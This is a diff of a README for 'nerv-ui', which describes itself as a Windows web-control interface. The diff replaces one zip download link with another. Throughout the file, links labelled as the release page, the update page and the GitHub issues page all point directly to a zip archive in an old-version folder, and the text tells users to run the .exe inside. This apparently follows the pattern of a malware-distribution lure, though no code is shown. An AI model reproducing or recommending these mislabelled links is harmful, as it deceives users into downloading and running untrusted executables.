@@ -1,6 +1,6 @@
 # 🖥️ nerv-ui - Clean Interface for Easy Web Control
 
-[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip)
+[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Use this guide to get nerv-ui running on your Windows computer. It will take you
 
 Click the big blue button above or visit the page below to get the latest release.
 
-[Download nerv-ui from GitHub Releases](https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip)
+[Download nerv-ui from GitHub Releases](https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip)
 
 This link takes you to the release page where you can find the latest version for Windows. Look for a file that ends with `.exe`. That is the installer you need.
 
@@ -90,7 +90,7 @@ No programming skills are needed to use the basic features. Just click and selec
 
 To keep nerv-ui secure and performing well, check the release page regularly:
 
-[https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip](https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip)
+[https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip](https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip)
 
 When you see a new version, download the latest `.exe` file and run it. The installer will update your existing version without removing your settings.
 
@@ -132,10 +132,10 @@ nerv-ui is open to use under the terms of the MIT License. This means you can us
 
 For help with installation or usage:
 
-- Visit the GitHub issues page here: https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip
+- Visit the GitHub issues page here: https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip
 - Check the documents folder for guides.
 - Submit a detailed bug report if needed, including your Windows version and what steps you took.
 
 ---
 
-[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/huskyyy12345/nerv-ui/main/v1-old/ui-nerv-1.6.zip)
+[![Download nerv-ui](https://img.shields.io/badge/Download-nerv--ui-blue?style=for-the-badge&logo=github)](https://github.com/huskyyy12345/nerv-ui/raw/refs/heads/main/v1-old/nerv_ui_v2.8.zip)
